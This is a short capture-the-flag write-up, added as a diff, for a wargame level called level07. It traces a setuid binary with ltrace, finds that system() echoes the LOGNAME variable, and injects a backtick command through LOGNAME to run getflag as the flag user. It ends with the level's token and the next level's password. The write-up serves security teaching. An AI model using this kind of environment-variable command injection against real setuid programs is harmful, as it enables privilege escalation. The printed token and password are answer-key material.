@@ -1,0 +1,41 @@
+We have a `level07` executable file
+
+    -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
+
+When executing `level07` it seems to print argv[0]:
+
+        ./level07
+
+    level07
+
+Let's using `ltrace` and try to understand what program really does:
+
+        ltrace ./level07
+
+    __libc_start_main(0x8048514, 1, 0xbffff7c4, 0x80485b0, 0x8048620 <unfinished ...>
+    getegid()                                                                                                                                              = 2007
+    geteuid()                                                                                                                                              = 2007
+    setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                                                    = 0
+    setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                                                                                    = 0
+    getenv("LOGNAME")                                                                                                                                      = "level07"
+    asprintf(0xbffff714, 0x8048688, 0xbfffff3c, 0xb7e5ee55, 0xb7fed280)                                                                                    = 18
+    system("/bin/echo level07 "level07
+     <unfinished ...>
+    --- SIGCHLD (Child exited) ---
+    <... system resumed> )                                                                                                                                 = 0
+    +++ exited (status 0) +++
+
+The program call `getenv()` and get the variable `LOGNAME` 
+
+        echo $LOGNAME
+
+    level07
+
+If we change the variable `LOGNAME` the program should print its new value, also we can pass command in variable using backticks:
+
+    export LOGNAME="\`getflag\`"
+    ./level07
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
+LEVEL08 PASSWORD: fiumuikeil55xe9cu4dood66h
